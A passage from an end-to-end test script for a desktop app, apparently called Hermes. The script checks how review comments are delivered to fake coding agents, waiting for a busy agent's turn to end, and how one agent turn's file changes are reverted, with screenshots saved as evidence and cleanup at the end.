    return d && d.getAttribute("data-state") === "sending" ? true : null;
  `, { timeoutMs: 5_000 }).catch(() => log("  (the retry settled before it could be seen as sending)"));
  await bridge.waitFor("not delivered again", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "2");
    return d && d.getAttribute("data-state") === "not_delivered" ? true : null;
  `, { timeoutMs: 15_000 });
  const promptsB2 = await waitForPrompts(idB, 2);
  assert(promptsB2[1] === promptsB2[0], "Retry pasted the same tagged line again");

  log("step 6b: Send to Agent A while it works — nothing is typed into a busy agent; the line goes out when its turn ends");
  await bridge.click(`.review-turn-row[data-turn="1"]`);
  await bridge.waitFor("turn 1's file", `return e2e.all(".review-turn-file").length === 1;`);
  const c3 = await commentOn(bridge, "src/app.js", "Add a comment saying why it is 3.");
  assert(c3.session === idA, "a new comment for Agent A");
  const idleA = await statusOf(bridge, idA);
  assert(idleA.kind !== "working", `Agent A is not working before the turn (${idleA.kind}, ${idleA.confidence})`);
  // The person gives Agent A a long turn (the fake works 8 s, then runs its Stop hook).
  await typeInto(bridge, idA, "work 8000\r");
  const busyA = await bridge.waitFor("Agent A's status to be working (exact, from its prompt hook)", `
    const s = window.__HERMES_E2E__.sessionEventSnapshot(${JSON.stringify(idA)});
    return s.status.kind === "working" && s.status.confidence === "exact" ? s.status : null;
  `, { timeoutMs: 10_000 });
  log(`  Agent A: ${JSON.stringify(busyA)}`);
  const promptsBefore = (await waitForPrompts(idA, 2)).length;
  await bridge.click(`.review-send[data-session="${idA}"] .review-send-btn`);
  const waiting = await bridge.waitFor("the send to wait for the turn", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3" && el.getAttribute("data-state") === "waiting");
    return d ? e2e.norm(d.textContent) : null;
  `, { timeoutMs: 5_000 });
  log(`  Hermes shows "${waiting}"`);
  await sleep(2_000);
  assert((recordOf(idA).prompts ?? []).length === promptsBefore, "while Agent A worked, nothing was typed into it");
  assert(!(await bridge.exists(".review-delivery[data-n='3'][data-state='delivered']")), "review 3 is not delivered yet");
  const deliveredA3 = await bridge.waitFor("delivery of review 3 once the turn ended", `
    const d = e2e.all(".review-delivery").find((el) => el.getAttribute("data-n") === "3");
    return d && d.getAttribute("data-state") === "delivered" ? e2e.norm(d.textContent) : null;
  `, { timeoutMs: 20_000 });
  log(`  Hermes shows "${deliveredA3}"`);
  const promptsA3 = await waitForPrompts(idA, promptsBefore + 1);
  assert(promptsA3[promptsBefore].startsWith("[hermes-review #3] "), "the tagged line for review 3 reached Agent A after its turn");
  const evs = recordOf(idA).events ?? [];
  const iWork = evs.findIndex((e) => e.ev === "working");
  const iEnd = evs.findIndex((e, i) => i > iWork && e.ev === "turn-end");
  const iLine = evs.findIndex((e, i) => i > iWork && e.ev === "prompt");
  assert(iWork >= 0 && iEnd > iWork && iLine > iEnd, `the fake read the line only after its turn ended (working@${iWork}, turn-end@${iEnd}, prompt@${iLine})`);
  const afterA = await statusOf(bridge, idA);
  log(`  Agent A after the receipt: ${JSON.stringify(afterA)}`);
  await bridge.screenshot(join(evidenceDir, "04b-waited-for-the-turn.png"));

  log("step 7: revert turn 2 — preview, apply, and turn 1 stays intact");
  await bridge.click(`.review-turn-row[data-turn="2"]`);
  await bridge.waitFor("turn 2 selected", `return e2e.first('.review-turn-row[data-turn="2"]')?.classList.contains("review-row-selected");`);
  await bridge.click(".review-revert-btn");
  const preview = await bridge.waitFor("the revert preview", `
    const p = e2e.first(".review-revert-preview");
    if (!p || !p.querySelector(".review-revert-clean")) return null;
    return { clean: p.querySelector(".review-revert-clean").getAttribute("data-clean"), files: [...p.querySelectorAll(".review-revert-files li")].map((li) => li.getAttribute("data-path")).sort() };
  `, { timeoutMs: 15_000 });
  assert(preview.clean === "1", "the preview says the revert applies cleanly");
  assert(JSON.stringify(preview.files) === JSON.stringify([".github/workflows/ci.yml", "package-lock.json", "src/util.js"]), "the preview lists exactly turn 2's three files");
  await bridge.screenshot(join(evidenceDir, "05-revert-preview.png"));
  await bridge.click(".review-revert-confirm");
  await bridge.waitFor("the revert to finish", `return !e2e.first(".review-revert-preview") && !!e2e.first(".review-notice");`, { timeoutMs: 20_000 });
  assert(read("src/util.js") === BASE["src/util.js"], "src/util.js is back at the base");
  assert(read("package-lock.json") === BASE["package-lock.json"], "package-lock.json is back at the base");
  assert(read(".github/workflows/ci.yml") === BASE[".github/workflows/ci.yml"], "the workflow is back at the base");
  assert(read("src/app.js") === "const a = 1;\nconst b = 3;\nexport default a + b;\n", "turn 1's change to src/app.js is intact");
  const status = git("status", "--porcelain");
  assert(status.trimEnd() === " M src/app.js", `git status shows only turn 1's file (${JSON.stringify(status.trimEnd())})`);
  await bridge.click('.review-group-btn[data-group="file"]');
  await bridge.waitFor("the by-file list to shrink to one file", `return e2e.all(".review-file-row").length === 1 && e2e.first(".review-file-row").getAttribute("data-path") === "src/app.js";`, { timeoutMs: 15_000 });
  assert(true, "the desk now lists only src/app.js");
  await bridge.screenshot(join(evidenceDir, "06-after-revert.png"));
  await closeDesk(bridge);
} catch (e) {
  failed = true;
  log(`FAILED: ${e?.stack ?? e}`);
  try {
    if (app?.isRunning()) {
      await app.bridge.screenshot(join(evidenceDir, "99-failure.png"));
      const dump = await app.bridge.eval(`
        return {
          desk: !!e2e.first(".review-desk"),
          buttons: e2e.all("button").map(e2e.nameOf).slice(0, 40),
          deliveries: e2e.all(".review-delivery").map((el) => ({ n: el.getAttribute("data-n"), state: el.getAttribute("data-state"), text: e2e.norm(el.textContent) })),
          terminals: window.__HERMES_E2E__.terminalIds().map((id) => ({ id, tail: (window.__HERMES_E2E__.readTerminal(id) || []).slice(-8) })),
        };
      `);
      log(`  what the app showed: ${JSON.stringify(dump)}`);
    }
  } catch (inner) {
    log(`  (could not capture failure evidence: ${inner.message})`);
  }
} finally {
  if (app?.isRunning()) {
    log("quit the app");
    const exit = await app.stop();
    log(`  app exited: ${JSON.stringify(exit)}`);
    if (!failed && (exit.forced || exit.code !== 0)) {
      failed = true;
      log("FAILED: the app did not quit cleanly");
    }
  }
  try {
    undoRegistryPath?.();
  } catch (e) {
    log(`  (could not restore the registry Path: ${e.message})`);
  }
  try {
    cpSync(recordDir, join(evidenceDir, "fake-launch-records"), { recursive: true });
  } catch {
    /* best effort */
  }
  rmSync(work, { recursive: true, force: true });
}

finishScenario({ scenario: SCENARIO, evidenceDir, failed, startedAt, log });
